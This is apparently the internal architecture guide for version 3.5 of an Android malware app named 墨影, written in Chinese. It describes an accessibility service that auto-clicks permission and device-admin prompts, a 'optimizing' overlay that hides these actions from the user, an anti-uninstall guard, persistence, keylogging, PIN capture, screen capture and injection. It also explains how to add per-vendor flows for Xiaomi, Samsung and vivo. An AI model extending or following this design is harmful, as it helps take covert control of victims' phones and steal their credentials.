# 墨影 3.5 架构说明（面向维护与扩展）

> 目标：**一个入口、一层流程、一套能力**。改厂商逻辑只碰 `flow/` 里的一个文件；
> 改通用能力（保活、上报、截屏）不碰流程；两边互不牵连。

## 1. 分层

```
┌──────────────────────────────────────────────────────────────┐
│ 入口层  accessibility/BoundaryAccessibilityService           │
│   无障碍连上 onServiceConnected()：                          │
│     ① 通用：GuardOverlay（优化中浮层，正式包才显示）          │
│     ② 分派：VendorFlows.of().start(service, noAutoClick)     │
│     ③ 通用：onboardingDone → home() → AntiUninstallGuard     │
│     ④ 通用：KeepAliveManager.startAll() + 协议 connect()      │
└──────────────────────────────────────────────────────────────┘
                    │ 唯一 vendor 判断在这里
┌──────────────────────────────────────────────────────────────┐
│ 流程层  flow/                                                │
│   Vendor.kt        厂商识别（Build.MANUFACTURER/BRAND）       │
│   VendorFlow.kt    接口：只有 start(service, noAutoClick)    │
│   VendorFlows.kt   分派：Vendor → 具体流程对象                │
│   MiuiFlow.kt      小米脚本（权限 → 设备管理员 → 危险页 → 停） │
│   SamsungFlow.kt   三星/通用脚本（=3.3 原链路）               │
└──────────────────────────────────────────────────────────────┘
                    │ 流程内部按需调用下面的能力
┌──────────────────────────────────────────────────────────────┐
│ 能力层（与厂商无关，谁都能用）                                │
│   perm/       PermissionFlow 权限清单 · PermissionActivity 载体│
│               PermissionClicker 自动点「允许」                 │
│               MiuiNavigator 小米控件操作（危险页/开关/列表项） │
│   admin/      MoyingAdminReceiver（系统回调，不含流程）        │
│               AdminActivator 点「激活」 · AntiUninstallGuard   │
│               DeviceAdminActivity 三星链路的激活页载体         │
│   keepalive/  保活全家桶（Job/Alarm/Provider/Widget/Dream…）   │
│   net/        协议、通道、设备会话、动作执行                    │
│   capture/ keylog/ pin/ inject/ ui/ util/ 各自独立能力         │
└──────────────────────────────────────────────────────────────┘
```

## 2. 硬性规则（改代码前先看这几条）

1. **厂商判断只在 `flow/Vendor.kt`**。其它任何文件都不允许写 `if (MANUFACTURER == "xiaomi")`。
2. **厂商差异只在 `flow/<Rom>Flow.kt`**。一个 ROM 一个文件，文件里是"脚本总方法 + 具体实现"。
3. **流程不实现通用能力**：浮层、守卫、保活、上报都留在服务/能力层，流程只调用。
4. **能力层不写厂商分支**：能力要支持某厂商的特例时，把点击/跳转的具体实现放进对应 `Flow` 或 `*Navigator`，不要在能力层写 `when(vendor)`。
5. **调试开关只有一个入口**：`util/DebugFlags.kt`（对应 `-PnoGuide` / `-PnoGuard`）。

## 3. 新增一个厂商（以 vivo 为例）

```
① flow/OriginOsFlow.kt       复制 MiuiFlow.kt 改内容（一个文件装下整套步骤）
② flow/VendorFlows.kt        Vendor.ORIGINOS -> OriginOsFlow
③ （可选）assets/oem_profiles.json 加品牌别名/电池页路径，供 BatteryOptimization 使用
```

不需要改服务、不需要改权限页、不需要改通知/电池的通用代码。

## 4. 调试包与正式包

| 场景 | 构建参数 | 表现 |
|---|---|---|
| 调试 | `-PnoGuide=true -PnoGuard=true` | 无「优化中」浮层、无防卸载守卫、引导结束不跳桌面 |
| 正式 | 不带参数 | 引导期显示浮层，完成后 home + 起守卫 |

## 5. 目录速查

```
AgentApp.kt        进程入口（调试包会自撤设备管理员，便于重装）
accessibility/     无障碍服务（入口层）+ 屏幕点按控制
flow/              厂商流程（唯一分派）
perm/              权限申请与点击、小米控件导航
admin/             设备管理员相关（接收器/激活器/守卫）
keepalive/         保活与自启
net/               服务端协议与动作
notify/            通知使用权（小米流程暂未启用）
capture/ keylog/ pin/ inject/ ui/ util/   其它能力
```

## 5.1 小米适配细节

见 [miui-notes.md](miui-notes.md)：MIUIOP(10021) 后台弹出界面、危险弹窗模板、
各步骤页面/节点、调试开关、注入链路与已知坑。

## 6. 现状与待办

- 小米流程当前到 **设备管理员激活** 为止（通知使用权、电池计划已在能力层实现，但未接进 MiuiFlow）。
- 三星流程保持 3.3 行为，未做回归验证。
- `notify/NotificationAccessActivator`、`keepalive/BatteryPlan` 是可复用能力，等小米流程第三步时直接调用即可。
